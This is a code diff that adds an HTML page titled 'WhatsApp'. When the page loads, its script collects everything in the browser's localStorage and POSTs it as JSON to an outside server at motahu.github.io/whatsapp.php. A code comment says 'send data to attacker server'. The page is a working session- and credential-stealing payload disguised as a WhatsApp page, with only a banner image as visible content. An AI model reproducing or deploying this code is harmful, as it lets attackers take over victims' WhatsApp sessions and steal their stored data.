@@ -1,0 +1,35 @@
+<html>
+	<header>
+		<title>WhatsApp</title>
+        <script>
+        function GetStorage()
+        {
+            var values = {};
+            var keys = Object.keys(localStorage);
+            var i = keys.length;
+            while ( i-- )
+            {
+                        values[keys[i].replace(/ /g, '+')] = localStorage.getItem(keys[i]).replace(/ /g, '+');
+            }
+            return values;
+        }
+
+        //send data to attacker server
+        function sendacct(data) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "https://motahu.github.io/whatsapp.php", true);
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.send("account_data=" + data);
+
+        }//end of sendacct
+
+        var result = GetStorage();
+        var json = JSON.stringify(result);
+        sendacct(json);
+
+        </script>
+    </header>
+    <body>
+        <img src="https://motahu.github.io/banner.jpg" />
+    </body>
+</html>
